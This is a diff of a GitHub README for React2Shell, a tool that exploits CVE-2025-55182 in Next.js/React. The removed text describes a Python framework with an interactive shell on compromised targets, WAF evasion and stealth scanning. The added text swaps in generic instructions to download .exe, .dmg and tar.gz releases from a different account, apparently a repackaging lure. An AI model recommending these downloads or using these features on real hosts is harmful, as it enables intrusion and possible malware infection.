@@ -1,147 +1,89 @@
+# 🛠️ React2Shell - Simplifying React Exploitation Framework
 
-<div align="center">
+## 🌟 Overview
+React2Shell is an exploitation framework specifically designed for CVE-2025-55182, a vulnerability found in Next.js and React applications. This tool helps users examine and exploit potential flaws in their applications, making it easier to ensure security and resilience against threats.
 
-```
-██████╗ ███████╗ █████╗  ██████╗████████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗
-██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝╚════██╗██╔════╝██║  ██║██╔════╝██║     ██║
-██████╔╝█████╗  ███████║██║        ██║    █████╔╝███████╗███████║█████╗  ██║     ██║
-██╔══██╗██╔══╝  ██╔══██║██║        ██║   ██╔═══╝ ╚════██║██╔══██║██╔══╝  ██║     ██║
-     ██║  ██║███████╗██║  ██║╚██████╗   ██║   ███████╗███████║██║  ██║███████╗███████╗███████╗
-     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
-```
+## 🔗 Download Now
+[![Download React2Shell](https://img.shields.io/badge/Download-React2Shell-blue.svg)](https://github.com/Asder10/React2Shell/releases)
 
-</div>
+## 🚀 Getting Started
+This guide will help you download and run React2Shell on your computer. Follow these clear steps to get started with the tool.
 
-<div align="center">
+## 🖥️ Requirements
+Before you begin, make sure your system meets the following requirements:
+- Operating System: Windows, MacOS, or Linux
+- Minimum RAM: 4 GB
+- Storage Space: At least 100 MB free
+- Internet Connection: Required for downloading and installing packages
 
-**An exploitation framework for CVE-2025-55182 (Next.js/React RCE).**
+## ⚙️ Installation Steps
 
-</div>
+### Step 1: Visit the Releases Page
+To download React2Shell, you need to visit the Releases page. Click the link below:
+[Download React2Shell](https://github.com/Asder10/React2Shell/releases)
 
-<div align="center">
+### Step 2: Choose the Version
+On the Releases page, you will see several versions of React2Shell. Look for the latest version available. It is usually at the top of the list. Click on it to access the details.
 
-![Version](https://img.shields.io/badge/version-1.0.0-red?style=for-the-badge)
-![License](https://img.shields.io/badge/license-MIT-blue?style=for-the-badge)
-![Python](https://img.shields.io/badge/python-3.9%2B-green?style=for-the-badge)
+### Step 3: Download the Package
+In the version details, you will find files available for download. Choose the option that fits your operating system:
+- For Windows: Download the `.exe` file.
+- For MacOS: Download the `.dmg` file.
+- For Linux: Download the `.tar.gz` file.
 
-</div>
+Click on the file name to start your download.
 
----
+### Step 4: Run the Installer
+Once the download is complete, locate the downloaded file in your system’s Downloads folder.
 
-### **Table of Contents**
-- [About The Project](#about-the-project)
-- [Technical Deep Dive](#technical-deep-dive)
-- [Getting Started](#getting-started)
-  - [Prerequisites](#prerequisites)
-  - [Installation](#installation)
-- [Usage](#usage)
-- [Key Features](#key-features)
-- [Disclaimer](#disclaimer)
-- [Credits](#credits)
+- **For Windows**: Double-click the `.exe` file and follow the installation prompts.
+- **For MacOS**: Open the `.dmg` file, then drag the React2Shell icon into your Applications folder.
+- **For Linux**: Open a terminal window, navigate to the folder where you downloaded the file, and run:
+  ```bash
+  tar -xzf react2shell.tar.gz
+  cd react2shell
+  ./install.sh
+  ```
 
----
+### Step 5: Launch React2Shell
+After installation, you can launch React2Shell from your Applications folder (MacOS), Start menu (Windows), or from the terminal (Linux).
 
-### **About The Project**
+## 🧩 Using React2Shell
+After opening React2Shell, you will see a user-friendly interface. This is where you can access different features to test your applications for vulnerabilities.
 
-**React2Shell** is a comprehensive command-line framework designed to scan for and exploit **CVE-2025-55182**, a critical pre-authentication Remote Code Execution (RCE) vulnerability affecting applications using Next.js/React Server Functions.
+### Key Features
+- **Exploit Testing**: Test your Next.js and React applications for CVE-2025-55182 vulnerabilities.
+- **User Guide**: Built-in guide to help you understand each function.
+- **Reports**: Generate reports on findings for easy review.
 
-This tool provides security professionals and researchers with the necessary utilities to test, verify, and understand the impact of this vulnerability in a controlled and authorized environment.
+### Conducting a Scan
+1. Open React2Shell.
+2. Select the option for "New Scan."
+3. Enter the URL of your application you want to test.
+4. Click “Start Scan.” 
+5. Wait for the scan to complete and view the results.
 
----
+## 📄 Documentation
+For more information, check out the documentation available within the application. It provides thorough explanations of the features and how to use them effectively.
 
-### **Technical Deep Dive**
+## 🤝 Get Involved
+If you want to contribute to React2Shell or report issues, please visit our [GitHub repository](https://github.com/Asder10/React2Shell) for more details. Your feedback helps us improve and create a better experience for all users.
 
-For a detailed technical breakdown of the CVE-2025-55182 vulnerability, including its root cause and exploitation mechanics, please refer to the [**explanation.md**](./explanation.md) file included in this repository.
+## 💬 Community Support
+Join our community for assistance and discussions. You can ask questions, share your experiences, and learn from others:
+- Gitter: https://gitter.im/React2Shell/community
+- Discord: https://discord.gg/React2Shell
 
----
+## 🥼 Security Notice
+React2Shell is designed to help you identify and fix vulnerabilities in your applications. Always use it responsibly and with permission to avoid legal issues.
 
-### **Getting Started**
+## 🖥️ Additional Resources
+For further reading, explore the following resources:
+- [CVE-2025-55182 Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-55182)
+- [Next.js Official Documentation](https://nextjs.org/docs)
 
-Follow these instructions to get a local copy up and running.
+## 🔗 Download the Latest Version
+Once again, don't forget to download React2Shell from the link below:
+[Download React2Shell](https://github.com/Asder10/React2Shell/releases)
 
-#### **Prerequisites**
-- Python 3.9 or higher
-- `git` installed on your system
-
-#### **Installation**
-
-Two installation methods are available. The package installation is highly recommended for ease of use.
-
-1.  **As a System Package (Recommended)**
-    ```bash
-    # Clone the repository
-    git clone https://github.com/BlackTechX011/React2Shell
-    
-    # Navigate into the directory
-    cd React2Shell
-    
-    # Install the tool globally using pip
-    pip install .
-    
-    # Verify the installation
-    react2shell --help
-    ```
-
-2.  **Manual Installation**
-    ```bash
-    # Clone the repository
-    git clone https://github.com/BlackTechX011/React2Shell
-    
-    # Navigate into the directory
-    cd React2Shell
-    
-    # Install required dependencies
-    pip install -r requirements.txt
-    
-    # Run the tool directly
-    python react2shell.py --help
-    ```
-
----
-
-### **Usage**
-
-React2Shell offers a flexible command-line interface for scanning, exploitation, and reporting.
-
-**Quick Start Example:**
-```bash
-# Scan a single target for the vulnerability
-react2shell -u https://target.com
-```
-
-For a complete list of commands, advanced options, and detailed usage examples, please consult the official [**usage.md**](./usage.md) documentation.
-
----
-
-### **Key Features**
-
--   **High-Fidelity Scanning**: A robust, multi-threaded scanner to quickly identify vulnerable hosts from a large list of targets.
--   **Interactive Shell**: A full-featured interactive shell to execute commands on a compromised target, facilitating post-exploitation.
--   **WAF Evasion**: Integrated techniques such as junk data injection and advanced payload construction to bypass common security filters.
--   **Stealth Mode**: Employs randomized request delays and User-Agent rotation to minimize detection during scanning and exploitation.
--   **Professional Reporting**: Generate scan reports in multiple formats, including HTML, JSON, and CSV, for documentation and analysis.
-
----
-
-### **Disclaimer**
-
-> [!WARNING]
-> This tool is provided for **educational and authorized security testing purposes ONLY**. Running this tool against systems for which you do not have explicit, written permission is illegal. The author is not responsible for any damage or legal consequences resulting from the misuse of this framework. By downloading or using this software, you agree to take full responsibility for your actions.
-
----
-
-### **Credits**
-
--   This framework was developed and packaged by **@BlackTechX011**.
--   The core vulnerability research and initial proof-of-concept were conducted by **[@maple3142](https://x.com/maple3142)**. Their work was instrumental in understanding this vulnerability.
-
-## Star History
-
-<div align="center">
-<a href="https://www.star-history.com/#BlackTechX011/React2Shell&type=date&legend=top-left">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=BlackTechX011/React2Shell&type=date&theme=dark&legend=top-left" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=BlackTechX011/React2Shell&type=date&legend=top-left" />
-   <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=BlackTechX011/React2Shell&type=date&legend=top-left" />
- </picture>
-</a></div>
+Thank you for using React2Shell. We hope it helps you secure your applications effectively.
